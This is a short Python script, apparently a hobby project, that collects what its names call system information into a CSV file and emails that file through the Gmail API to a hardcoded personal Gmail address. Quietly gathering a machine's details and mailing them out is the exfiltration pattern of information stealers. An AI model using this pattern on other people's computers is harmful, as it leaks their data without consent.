import gmailapi
import csv_test

# save_file = r"C:\Users\chand\Desktop\PythonProjects\spreadsheets\"

save_file = r"./"
# get the Gmail API service
csv_test.collect_data(save_file)

service = gmailapi.gmail_authenticate()

gmailapi.send_message(
    service,
    "lol2dinfamous@gmail.com",
    "This is a subject",
    "This is the body of the email",
    [save_file + "System_Information.csv"],
)
